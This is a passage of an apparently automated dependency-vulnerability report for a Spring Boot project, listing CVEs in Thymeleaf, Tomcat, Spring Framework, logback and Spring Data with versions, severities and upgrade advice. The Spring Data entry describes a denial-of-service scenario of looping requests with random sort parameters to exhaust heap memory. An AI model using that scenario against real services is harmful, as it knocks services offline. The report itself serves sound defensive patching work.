A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.3.RELEASE. Although the library provides mechanisms to prevent expression injection, it fails to properly neutralize specific syntax patterns that allow for the execution of unauthorized expressions. If an application developer passes unvalidated user input directly to the template engine, an unauthenticated remote attacker can bypass the library's protections to achieve Server-Side Template Injection (SSTI).

### Patches
This has been fixed in Thymeleaf 3.1.4.RELEASE.

### Workarounds
No workaround is available beyond ensuring applications do not pass unvalidated user input directly to the template engine. Upgrading to 3.1.4.RELEASE is strongly recommended in any case.

### Credits
Thanks to Dawid Bakaj (VIPentest.com) for responsible disclosure.

### CVE-2026-40477: Improper restriction of the scope of accessible objects in Thymeleaf expressions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:40

[CVE-2026-40477](https://github.com/advisories/GHSA-r4v4-5mwr-2fwr): Improper restriction of the scope of accessible objects in Thymeleaf expressions

Severity: CRITICAL

Affected resolved dependencies:
  - org.thymeleaf:thymeleaf:3.1.3.RELEASE (compile; via spring-boot-starter-thymeleaf at pom.xml:40); affected range <= 3.1.3.RELEASE
  - org.thymeleaf:thymeleaf-spring6:3.1.3.RELEASE (compile; via spring-boot-starter-thymeleaf at pom.xml:40); affected range <= 3.1.3.RELEASE

Recommended fix:
  - org.thymeleaf:thymeleaf: upgrade to 3.1.4.RELEASE or later in a supported release line
  - org.thymeleaf:thymeleaf-spring6: upgrade to 3.1.4.RELEASE or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Impact
A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.3.RELEASE. Although the library provides mechanisms to prevent expression injection, it fails to properly restrict the scope of accessible objects, allowing specific potentially sensitive objects to be reached from within a template. If an application developer passes unvalidated user input directly to the template engine, an unauthenticated remote attacker can bypass the library's protections to achieve Server-Side Template Injection (SSTI).

### Patches
This has been fixed in Thymeleaf 3.1.4.RELEASE.

### Workarounds
No workaround is available beyond ensuring applications do not pass unvalidated user input directly to the template engine. Upgrading to 3.1.4.RELEASE is strongly recommended in any case.


### Credits
Thanks to Thomas Reburn (Praetorian) for responsible disclosure.

### CVE-2026-34483: Apache Tomcat has an Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-34483](https://github.com/advisories/GHSA-rv64-5gf8-9qq8): Apache Tomcat has an Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.54

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.54 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve component of Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.20, from 10.1.0-M1 through 10.1.53, from 9.0.40 through 9.0.116.

Users are recommended to upgrade to version 11.0.21, 10.1.54 or 9.0.117 , which fix the issue.

### CVE-2026-34487: Apache Tomcat vulnerable to Insertion of Sensitive Information into Log File
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-34487](https://github.com/advisories/GHSA-x4m4-345f-5h5g): Apache Tomcat vulnerable to Insertion of Sensitive Information into Log File

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.54

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.54 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Insertion of Sensitive Information into Log File vulnerability in the cloud membership for clustering component of Apache Tomcat exposed the Kubernetes bearer token.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.20, from 10.1.0-M1 through 10.1.53, from 9.0.13 through 9.0.116.

Users are recommended to upgrade to version 11.0.21, 10.1.54 or 9.0.117, which fix the issue.

### CVE-2026-25854: Apache Tomcat has an Open Redirect vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-25854](https://github.com/advisories/GHSA-9m3c-qcxr-9x87): Apache Tomcat has an Open Redirect vulnerability

Severity: MEDIUM

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.53

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.53 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Occasional URL redirection to untrusted Site ('Open Redirect') vulnerability in Apache Tomcat via the LoadBalancerDrainingValve.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.18, from 10.1.0-M1 through 10.1.52, from 9.0.0.M23 through 9.0.115, from 8.5.30 through 8.5.100.
Other, unsupported versions may also be affected

Users are recommended to upgrade to version 11.0.20, 10.1.53 or 9.0.116, which fix the issue.

### CVE-2026-24880: Apache Tomcat has an HTTP Request/Response Smuggling vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-24880](https://github.com/advisories/GHSA-563x-q5rq-57qp): Apache Tomcat has an HTTP Request/Response Smuggling vulnerability

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.52

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.52 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') vulnerability in Apache Tomcat via invalid chunk extension.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.18, from 10.1.0-M1 through 10.1.52, from 9.0.0.M1 through 9.0.115, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.
Other, unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.20, 10.1.52 or 9.0.116, which fix the issue.

### CVE-2026-22737: Spring Framework Improper Path Limitation with Script View Templates
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-22737](https://github.com/advisories/GHSA-4773-3jfm-qmx3): Spring Framework Improper Path Limitation with Script View Templates

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, < 6.2.17

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.17 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Use of Java scripting engine enabled (e.g. JRuby, Jython) template views in Spring MVC and Spring WebFlux applications can result in disclosure of content from files outside the configured locations for script template views. This issue affects Spring Framework: from 7.0.0 through 7.0.5, from 6.2.0 through 6.2.16, from 6.1.0 through 6.1.25, from 5.3.0 through 5.3.46.

### CVE-2026-24734: Apache Tomcat has an Improper Input Validation vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-24734](https://github.com/advisories/GHSA-mgp5-rv84-w37q): Apache Tomcat has an Improper Input Validation vulnerability

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M7, < 10.1.52

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.52 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Improper Input Validation vulnerability in Apache Tomcat Native, Apache Tomcat.

When using an OCSP responder, Tomcat Native (and Tomcat's FFM port of the Tomcat Native code) did not complete verification or freshness checks on the OCSP response which could allow certificate revocation to be bypassed.

This issue affects Apache Tomcat Native:  from 1.3.0 through 1.3.4, from 2.0.0 through 2.0.11; Apache Tomcat: from 11.0.0-M1 through 11.0.17, from 10.1.0-M7 through 10.1.51, from 9.0.83 through 9.0.114.


The following versions were EOL at the time the CVE was created but are 
known to be affected: from 1.1.23 through 1.1.34, from 1.2.0 through 1.2.39. Older EOL versions are not affected.

Apache Tomcat Native users are recommended to upgrade to versions 1.3.5 or later or 2.0.12 or later, which fix the issue.

Apache Tomcat users are recommended to upgrade to versions 11.0.18 or later, 10.1.52 or later or 9.0.115 or later which fix the issue.

### CVE-2025-66614: Apache Tomcat - Client certificate verification bypass
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-66614](https://github.com/advisories/GHSA-fpj8-gq4v-p354): Apache Tomcat - Client certificate verification bypass

Severity: MEDIUM

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.50

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.50 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Improper Input Validation vulnerability.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.14, from 10.1.0-M1 through 10.1.49, from 9.0.0-M1 through 9.0.112.

The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100. Older EOL versions are not affected. Tomcat did not validate that the host name provided via the SNI extension was the same as the host name provided in the HTTP host header field. If Tomcat was configured with more than one virtual host and the TLS configuration for one of those hosts did not require client certificate authentication but another one did, it was possible for a client to bypass the client certificate authentication by sending different host names in the SNI extension and the HTTP host header field.

The vulnerability only applies if client certificate authentication is only enforced at the Connector. It does not apply if client certificate authentication is enforced at the web application.

Users are recommended to upgrade to version 11.0.15 or later, 10.1.50 or later or 9.0.113 or later, which fix the issue.

### CVE-2025-55752: Apache Tomcat Vulnerable to Relative Path Traversal
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-55752](https://github.com/advisories/GHSA-wmwf-9ccg-fff5): Apache Tomcat Vulnerable to Relative Path Traversal

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.45

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.45 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
The fix for bug 60013 introduced a regression where the rewritten URL was normalized before it was decoded. This introduced the possibility that, for rewrite rules that rewrite query parameters to the URL, an attacker could manipulate the request URI to bypass security constraints including the protection for /WEB-INF/ and /META-INF/. If PUT requests were also enabled then malicious files could be uploaded leading to remote code execution. PUT requests are normally limited to trusted users and it is considered unlikely that PUT requests would be enabled in conjunction with a rewrite that manipulated the URI.



This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.10, from 10.1.0-M1 through 10.1.44, from 9.0.0.M11 through 9.0.108.

The following versions were EOL at the time the CVE was created but are  known to be affected: 8.5.6 though 8.5.100. Other, older, EOL versions may also be affected. Users are recommended to upgrade to version 11.0.11 or later, 10.1.45 or later or 9.0.109 or later, which fix the issue.

### CVE-2025-11226: QOS.CH logback-core is vulnerable to Arbitrary Code Execution through file processing
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-11226](https://github.com/advisories/GHSA-25qh-j22f-pwp8): QOS.CH logback-core is vulnerable to Arbitrary Code Execution through file processing

Severity: MEDIUM

Affected resolved dependencies:
  - ch.qos.logback:logback-core:1.5.18 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 1.4.0, < 1.5.19

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.5.19 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
QOS.CH logback-core versions up to 1.5.18 contain an ACE vulnerability in conditional configuration file processing in Java applications. This vulnerability allows an attacker to execute arbitrary code by compromising an existing logback configuration file or by injecting a malicious environment variable before program execution.

A successful attack requires the Janino library and Spring Framework to be present on the user's class path. Additionally, the attacker must have write access to a configuration file. Alternatively, the attacker could inject a malicious environment variable pointing to a malicious configuration file. In both cases, the attack requires existing privileges.

### CVE-2025-41242: Spring Framework MVC Applications Path Traversal Vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-41242](https://github.com/advisories/GHSA-r936-gwx5-v52f): Spring Framework MVC Applications Path Traversal Vulnerability

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-webmvc:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, < 6.2.10

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 6.2.10 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring Framework MVC applications can be vulnerable to a “Path Traversal Vulnerability” when deployed on a non-compliant Servlet container.

An application can be vulnerable when all the following are true:

  *  the application is deployed as a WAR or with an embedded Servlet container
  *  the Servlet container  does not reject suspicious sequences https://jakarta.ee/specifications/servlet/6.1/jakarta-servlet-spec-6.1.html#uri-path-canonicalization 
  *  the application  serves static resources https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-config/static-resources.html#page-title  with Spring resource handling


We have verified that applications deployed on Apache Tomcat or Eclipse Jetty are not vulnerable, as long as default security features are not disabled in the configuration. Because we cannot check exploits against all Servlet containers and configuration variants, we strongly recommend upgrading your application.

### CVE-2025-48989: Apache Tomcat Improper Resource Shutdown or Release vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-48989](https://github.com/advisories/GHSA-gqp3-2cvr-x8m3): Apache Tomcat Improper Resource Shutdown or Release vulnerability

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.44

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.44 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Improper Resource Shutdown or Release vulnerability in Apache Tomcat made Tomcat vulnerable to the made you reset attack.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.9, from 10.1.0-M1 through 10.1.43 and from 9.0.0.M1 through 9.0.107. Older, EOL versions may also be affected.

Users are recommended to upgrade to one of versions 11.0.10, 10.1.44 or 9.0.108 which fix the issue.

### CVE-2025-55668: Apache Tomcat Session Fixation vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-55668](https://github.com/advisories/GHSA-23hv-mwm6-g8jf): Apache Tomcat Session Fixation vulnerability

Severity: MEDIUM

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.42

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.42 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Session Fixation vulnerability in Apache Tomcat via rewrite valve.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105.
Older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

### CVE-2025-53506: Apache Tomcat Coyote vulnerable to Denial of Service via excessive HTTP/2 streams
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-53506](https://github.com/advisories/GHSA-25xr-qj8w-c4vf): Apache Tomcat Coyote vulnerable to Denial of Service via excessive HTTP/2 streams

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.43

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.43 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Uncontrolled Resource Consumption vulnerability in Apache Tomcat if an HTTP/2 client did not acknowledge the initial settings frame that reduces the maximum permitted concurrent streams.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.8, from 10.1.0-M1 through 10.1.42, from 9.0.0.M1 through 9.0.106. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100.

Users are recommended to upgrade to version 11.0.9, 10.1.43 or 9.0.107, which fix the issue.

### CVE-2025-52520: Apache Tomcat Catalina is vulnerable to DoS attack through bypassing of size limits
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-52520](https://github.com/advisories/GHSA-wr62-c79q-cv37): Apache Tomcat Catalina is vulnerable to DoS attack through bypassing of size limits

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, < 10.1.43

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.43 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
For some unlikely configurations of multipart upload, an Integer Overflow vulnerability in Apache Tomcat could lead to a DoS via bypassing of size limits.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.8, from 10.1.0-M1 through 10.1.42, from 9.0.0.M1 through 9.0.106. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.9, 10.1.43 or 9.0.107, which fix the issue.

### CVE-2025-49124: Apache Tomcat installer for Windows has an untrusted search path vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-49124](https://github.com/advisories/GHSA-42wg-hm62-jcwg): Apache Tomcat installer for Windows has an untrusted search path vulnerability

Severity: MEDIUM

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0, < 10.1.42

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.42 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Untrusted Search Path vulnerability in Apache Tomcat installer for Windows. During installation, the Tomcat installer for Windows used icacls.exe without specifying a full path.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0 through 10.1.41, from 9.0.23 through 9.0.105.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

### CVE-2025-49125: Apache Tomcat - Security constraint bypass for pre/post-resources
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-49125](https://github.com/advisories/GHSA-wc4r-xq3c-5cf3): Apache Tomcat - Security constraint bypass for pre/post-resources

Severity: MEDIUM

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, <= 10.1.41

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.42 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Authentication Bypass Using an Alternate Path or Channel vulnerability in Apache Tomcat.  When using PreResources or PostResources mounted other than at the root of the web application, it was possible to access those resources via an unexpected path. That path was likely not to be protected by the same security constraints as the expected path, allowing those security constraints to be bypassed.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

### CVE-2025-48988: Apache Tomcat - DoS in multipart upload
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-48988](https://github.com/advisories/GHSA-h3gc-qfqq-6h8f): Apache Tomcat - DoS in multipart upload

Severity: HIGH

Affected resolved dependencies:
  - org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 10.1.0-M1, <= 10.1.41

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.42 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Allocation of Resources Without Limits or Throttling vulnerability in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

### CVE-2025-41234: Spring Framework vulnerable to a reflected file download (RFD)
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2025-41234](https://github.com/advisories/GHSA-6r3c-xf4w-jxjm): Spring Framework vulnerable to a reflected file download (RFD)

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework:spring-web:6.2.7 (compile; via spring-boot-starter-web at pom.xml:34); affected range >= 6.2.0, < 6.2.8

Recommended fix:
  - org.springframework:spring-web: upgrade to 6.2.8 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Description

In Spring Framework, versions 6.0.x as of 6.0.5, versions 6.1.x and 6.2.x, an application is vulnerable to a reflected file download (RFD) attack when it sets a “Content-Disposition” header with a non-ASCII charset, where the filename attribute is derived from user-supplied input.

Specifically, an application is vulnerable when all the following are true:

  -  The header is prepared with `org.springframework.http.ContentDisposition`.
  -  The filename is set via `ContentDisposition.Builder#filename(String, Charset)`.
  -  The value for the filename is derived from user-supplied input.
  -  The application does not sanitize the user-supplied input.
  -  The downloaded content of the response is injected with malicious commands by the attacker (see RFD paper reference for details).


An application is not vulnerable if any of the following is true:

  -  The application does not set a “Content-Disposition” response header.
  -  The header is not prepared with `org.springframework.http.ContentDisposition`.
  -  The filename is set via one of:  
     - `ContentDisposition.Builder#filename(String)`, or
     - `ContentDisposition.Builder#filename(String, ASCII)`
  -  The filename is not derived from user-supplied input.
  -  The filename is derived from user-supplied input but sanitized by the application.
  -  The attacker cannot inject malicious content in the downloaded content of the response.


### Affected Spring Products and VersionsSpring Framework

  -  6.2.0 - 6.2.7
  -  6.1.0 - 6.1.20
  -  6.0.5 - 6.0.28
  -  Older, unsupported versions are not affected


### Mitigation

Users of affected versions should upgrade to the corresponding fixed version.

| Affected version(s) | Fix version | Availability |
| - | - | - |
| 6.2.x | 6.2.8 | OSS |
| 6.1.x | 6.1.21 | OSS |
| 6.0.x | 6.0.29 | [Commercial](https://enterprise.spring.io/) |

No further mitigation steps are necessary.

### CVE-2026-41695: Spring Data: Unbounded property-path cache keyed by externally-supplied path string
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:46

[CVE-2026-41695](https://github.com/advisories/GHSA-88fw-v6x4-3f58): Spring Data: Unbounded property-path cache keyed by externally-supplied path string

Severity: HIGH

Affected resolved dependencies:
  - org.springframework.data:spring-data-commons:3.5.0 (compile; via spring-boot-starter-data-jpa at pom.xml:46); affected range >= 3.5.0, <= 3.5.11

Recommended fix:
  - org.springframework.data:spring-data-commons: upgrade to 3.5.12 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
`src/main/java/org/springframework/data/mapping/context/PersistentPropertyPathFactory.java:175` · Unbounded Resource Allocation (Algorithmic DoS)

### Impact

When a consuming module routes user-supplied dot-paths (sort parameters, projection paths, PATCH paths) through `MappingContext.getPersistentPropertyPath(String, Class)`, each distinct string — including invalid ones — is cached forever. A remote attacker can send millions of requests with unique `?sort=aaaa<n>` values and grow the heap until the service OOMs.

### Description

`PersistentPropertyPathFactory.propertyPaths` (line 53) is a `ConcurrentHashMap<TypeAndPath, PathResolution>` populated by `getPotentiallyCachedPath()` (line 174-177) via `computeIfAbsent`. The key is `(TypeInformation, rawPathString)`. Crucially, unresolvable paths are also cached (as `PathResolution.unresolved`, line 204) so that the same `InvalidPersistentPropertyPath` can be re-thrown — meaning every distinct garbage string an attacker sends creates a permanent entry. There is no eviction. This is reachable from `AbstractMappingContext.getPersistentPropertyPath(String, Class)` (`AbstractMappingContext.java:345`), which Spring Data REST and several store query mappers call with HTTP-request-derived sort/filter property names.

By contrast, the sibling `SimplePropertyPath.cache` was already hardened to use `ConcurrentReferenceHashMap` (soft refs); this cache was not given the same treatment.

### Exploit scenario

Against a Spring Data REST endpoint, an attacker scripts `GET /things?sort=<random-40-char-string>` in a loop. Each request fails fast with `InvalidPersistentPropertyPath`, but each distinct random string leaves behind a `TypeAndPath` key, a `PathResolution` object holding the split segments list, and the source string in the map. After ~10M requests the JVM OOMs.

### Preconditions

- A downstream component (Spring Data REST, a store-specific `QueryMapper`, or application code) passes externally-supplied strings to `MappingContext.getPersistentPropertyPath(String, ...)`
- No upstream rate-limiting or path-string validation

### How to fix

A cache whose key can be derived from external input must be bounded. Replace `propertyPaths` (line 53) with a `ConcurrentLruCache<TypeAndPath, PathResolution>` of fixed capacity, or `ConcurrentReferenceHashMap` (matching the sibling `SimplePropertyPath.cache`). Additionally, do not cache `PathResolution.unresolved` results at all (line 204 in `createPersistentPropertyPath`) — re-computing a failed lookup is cheap, and caching negative results for arbitrary attacker strings is what makes this exploitable.

### Adversarial verification

**Verdict:** TRUE_POSITIVE (confidence: 7/10) — unbounded hard-ref `ConcurrentHashMap` keyed by raw path string, caches unresolved entries (line 204), reachable via public `MappingContext.getPersistentPropertyPath(String, ...)`; sibling `PropertyPath` cache was already converted to soft-refs but this one was missed. -3 confidence because the HTTP-input wiring lives in downstream modules (Spring Data REST / store mappers), not verifiable in this repo.

**Code at the line — CONFIRMED**
- Line 53: `private final Map<TypeAndPath, PathResolution> propertyPaths = new ConcurrentHashMap<>();` — plain CHM, hard refs, no eviction, no size bound.
- Line 175: `propertyPaths.computeIfAbsent(TypeAndPath.of(type, propertyPath), ...)` — every distinct `(type, string)` pair is inserted.
- Line 204: `return PathResolution.unresolved(parts, segment, type, currentPath);` — returned from inside `computeIfAbsent`'s mapping function, so unresolvable paths are cached. The `PathResolution` retains the full attacker string (`source = StringUtils.collectionToDelimitedString(parts, ".")`, line 452).

**Callers within spring-data-commons**
- `AbstractMappingContext.getPersistentPropertyPath(String, Class<?>)` (line 345) and `(String, TypeInformation<?>)` (line 350) → `persistentPropertyPathFactory.from(type, propertyPath)` → straight into the unbounded cache. No validation, no `PropertyPath.from` gate.
- This is the public `MappingContext` interface (`MappingContext.java:174,186`), documented to throw `InvalidPersistentPropertyPath` on bad input — i.e., the contract explicitly anticipates being called with possibly-invalid strings.
- No in-repo caller routes HTTP input directly into the `String` overload. The `Sort.Order.property` → `getPersistentPropertyPath(String, ...)` bridge lives in store modules (Spring Data MongoDB `QueryMapper`, Spring Data REST sort translator). That wiring is out-of-repo as the finding states.

**Protections — NONE on this cache**
Contrast: `SimplePropertyPath.java:52` (the `PropertyPath.from` cache) uses `ConcurrentReferenceHashMap` (soft refs, GC-evictable). Spring already hardened the sibling cache against exactly this pattern. `PersistentPropertyPathFactory.propertyPaths` was not given the same treatment.

**Stress-test**
Is this exclusion #3 (intended design)? The `PathResolution` javadoc (line 426-430) says caching unresolved paths is deliberate — to make repeated lookups of the *same* bad path cheap. But unbounded hard-ref caching of *arbitrary attacker-chosen* keys is not the intent; the sibling fix proves Spring considers this a bug class.

### CVE-2026-41721: Spring Data Commons: Denial of Service via excessive memory allocation in projection binding
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:46

[CVE-2026-41721](https://github.com/advisories/GHSA-5m4m-73w9-8433): Spring Data Commons: Denial of Service via excessive memory allocation in projection binding

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework.data:spring-data-commons:3.5.0 (compile; via spring-boot-starter-data-jpa at pom.xml:46); affected range >= 3.5.0, <= 3.5.11

Recommended fix:
